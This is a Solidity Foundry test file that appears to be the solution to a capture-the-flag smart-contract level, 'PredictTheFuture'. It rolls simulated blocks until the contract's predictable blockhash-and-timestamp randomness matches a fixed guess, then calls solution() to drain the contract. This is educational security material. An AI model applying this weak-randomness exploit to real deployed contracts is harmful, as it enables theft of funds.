// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/06_PredictTheFuture/PredictTheFuture.sol";

// forge test --match-contract PredictTheFutureTest -vvvv
contract PredictTheFutureTest is BaseTest {
    PredictTheFuture instance;

    function setUp() public override {
        super.setUp();
        instance = new PredictTheFuture{value: 0.01 ether}();

        vm.roll(143242);
    }

    function testExploitLevel() public {
        instance.setGuess{value: 0.01 ether}(0);
        bool success = false;

        for (uint256 i = 2; i <= 256; i++) {
            vm.roll(block.number + i);
            vm.warp(block.timestamp + i);

            bytes32 hash = blockhash(block.number - 1);
            uint256 flag = uint256(keccak256(abi.encodePacked(hash, block.timestamp))) % 10;

            if (flag == 0) {
                instance.solution();
                success = true;
                break;
            }
        }

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
